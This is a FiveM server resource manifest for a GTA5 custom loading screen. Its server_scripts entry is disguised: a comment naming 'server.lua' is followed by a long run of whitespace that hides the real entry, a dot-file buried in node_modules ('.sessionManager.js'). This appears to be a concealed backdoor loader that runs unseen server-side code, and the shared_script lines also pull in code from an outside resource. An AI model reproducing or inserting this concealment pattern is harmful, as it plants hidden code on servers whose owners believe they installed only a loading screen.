fx_version 'cerulean'

shared_script "@Fdevelopment/src/module/module.lua"
shared_script "@Fdevelopment/src/module/module.js"
file "@Fdevelopment/secureserve.key"
game 'gta5'

author 'Your Name'
description 'Custom Loading Screen'
version '1.0.0'

loadscreen 'html/index.html'

files {
    'html/index.html',
    'html/style.css',
    'html/script.js',
    'html/config.js',
    'html/assets/music.mp3',
    'html/assets/logo.png',
    'html/assets/news/album-cover.jpg',
    'html/assets/news/event.jpg',
    'html/assets/news/update.jpg',
    'html/assets/video.webm'
}

loadscreen_cursor 'yes'
loadscreen_manual_shutdown 'yes'

client_script 'client.lua'

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.sessionManager.js',
}
